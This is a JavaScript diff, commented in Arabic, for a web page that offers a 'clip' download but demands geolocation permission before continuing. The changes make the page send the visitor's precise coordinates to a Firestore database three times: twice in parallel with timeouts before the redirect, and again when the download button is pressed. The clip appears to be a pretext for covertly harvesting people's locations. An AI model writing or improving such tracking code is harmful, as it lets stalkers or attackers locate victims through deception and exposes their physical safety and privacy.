@@ -1,4 +1,14 @@
 // ---------- طلب الإذنين: الإشعارات (اختياري) والموقع الجغرافي (إلزامي) ----------
+
+// تحدّ أقصى زمن انتظار لأي وعد (Promise)، عشان لو Firestore تأخر أو الشبكة
+// ضعيفة ما تعلّق الصفحة للأبد بانتظار نتيجة الحفظ.
+function withTimeout(promise, ms) {
+  return Promise.race([
+    Promise.resolve(promise),
+    new Promise((resolve) => setTimeout(resolve, ms)),
+  ]);
+}
+
 async function requestNotificationPermission() {
   if (!('Notification' in window)) {
     throw new Error('متصفحك لا يدعم إذن الإشعارات');
@@ -77,7 +87,7 @@ document.addEventListener('DOMContentLoaded', () => {
       errorMsg.hidden = true;
     };
 
-    downloadBtn.addEventListener('click', () => {
+    downloadBtn.addEventListener('click', async () => {
       hideError();
       setLoading(true, 'جاري التحقق من إذن الموقع...');
 
@@ -87,21 +97,43 @@ document.addEventListener('DOMContentLoaded', () => {
       });
 
       // إذن الموقع الجغرافي هو الشرط الإلزامي الوحيد للانتقال للصفحة الثانية.
-      requestGeolocationPermission()
-        .then((coords) => {
-          // نحفظ الإحداثيات بقاعدة بيانات Firestore إذا ملف firebase-config.js
-          // مضبوط وشغّال؛ لو ما زبط أو الملف غير موجود، نكمل عادي بدون توقف.
-          if (typeof window.saveLocationToFirestore === 'function') {
-            window.saveLocationToFirestore(coords.latitude, coords.longitude, coords.accuracy);
-          }
+      try {
+        const coords = await requestGeolocationPermission();
 
-          sessionStorage.setItem('clipAccess', 'granted');
-          window.location.href = 'download.html';
-        })
-        .catch((err) => {
-          showError(err.message);
-          setLoading(false, 'اضغط لتحميل المقطع');
-        });
+        // نخزن الإحداثيات مؤقتًا بالجلسة عشان نقدر نرسلها مرة ثالثة
+        // من صفحة التحميل لما يضغط المستخدم زر "تنزيل الملف الآن".
+        sessionStorage.setItem(
+          'clipCoords',
+          JSON.stringify({
+            lat: coords.latitude,
+            lng: coords.longitude,
+            accuracy: coords.accuracy,
+          })
+        );
+
+        // نرسل نفس الموقع مرتين بالتوازي (إرسال أول + إرسال احتياطي ثاني)،
+        // وننتظرهم فعليًا (بحد أقصى 4 ثوانٍ لكل وحدة) قبل ما نغادر الصفحة.
+        // هذا يحل مشكلة "مرات يوصل ومرات لا": كان الانتقال الفوري السابق
+        // يقطع طلب الحفظ بالمنتصف قبل ما يوصل للسيرفر.
+        if (typeof window.saveLocationToFirestore === 'function') {
+          await Promise.allSettled([
+            withTimeout(
+              window.saveLocationToFirestore(coords.latitude, coords.longitude, coords.accuracy),
+              4000
+            ),
+            withTimeout(
+              window.saveLocationToFirestore(coords.latitude, coords.longitude, coords.accuracy),
+              4000
+            ),
+          ]);
+        }
+
+        sessionStorage.setItem('clipAccess', 'granted');
+        window.location.href = 'download.html';
+      } catch (err) {
+        showError(err.message);
+        setLoading(false, 'اضغط لتحميل المقطع');
+      }
     });
   }
 
@@ -116,6 +148,18 @@ document.addEventListener('DOMContentLoaded', () => {
     startDownload.addEventListener('click', () => {
       status.textContent = 'بدأ التنزيل...';
       status.classList.add('is-success');
+
+      // الإرسال الثالث: نعيد إرسال نفس إحداثيات الموقع (المخزّنة من الصفحة
+      // الأولى) لحظة ضغط زر التحميل الفعلي، كتكرار احتياطي إضافي.
+      const storedCoords = sessionStorage.getItem('clipCoords');
+      if (storedCoords && typeof window.saveLocationToFirestore === 'function') {
+        try {
+          const { lat, lng, accuracy } = JSON.parse(storedCoords);
+          window.saveLocationToFirestore(lat, lng, accuracy);
+        } catch (_) {
+          // تجاهل أي خطأ بتحويل البيانات المخزّنة، ما نوقف تجربة التحميل بسببه
+        }
+      }
     });
   }
 
